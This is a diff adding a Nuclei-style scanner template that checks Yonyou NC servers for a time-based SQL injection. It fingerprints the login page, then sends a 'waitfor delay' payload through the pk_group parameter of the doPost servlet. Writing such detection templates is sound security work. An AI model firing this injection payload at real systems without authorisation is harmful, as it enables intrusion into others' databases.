@@ -1,0 +1,48 @@
+id: poc-yaml-yongyou-nc-dopost-sqli
+info:
+  name: Yonyou NC doPost SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: Yonyou NC
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-page
+    method: GET
+    path:
+      - "{{BaseURL}}/index.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<TITLE>Yonyou NC</TITLE>"
+
+  - id: check-sqli
+    method: GET
+    path:
+      - "{{BaseURL}}/portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:{{t1}}'--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<Pages>"
+          - "xml"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
